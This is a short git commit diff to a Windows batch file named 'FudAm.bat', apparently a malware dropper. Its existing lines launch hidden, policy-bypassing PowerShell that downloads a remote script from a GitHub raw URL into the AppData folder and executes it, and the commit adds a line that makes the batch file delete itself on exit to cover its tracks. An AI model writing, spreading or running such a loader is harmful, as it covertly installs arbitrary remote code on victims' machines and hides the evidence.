cd033a6289e5c0d85028ca40883bd6905b36ac65
AnonAm93 <am9.9@outlook.com>
2024-10-06 00:37:15 +0200

    Add files via upload

--- FudAm.bat
+++ FudAm.bat
@@ -22,3 +22,5 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0
 
 powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/AnonAm93/1/raw/refs/heads/main/Am.ps1).content > "$env:APPDATA\Am.ps1";powershell "$env:APPDATa\Am.ps1""
+
+del "%~f0" & exit
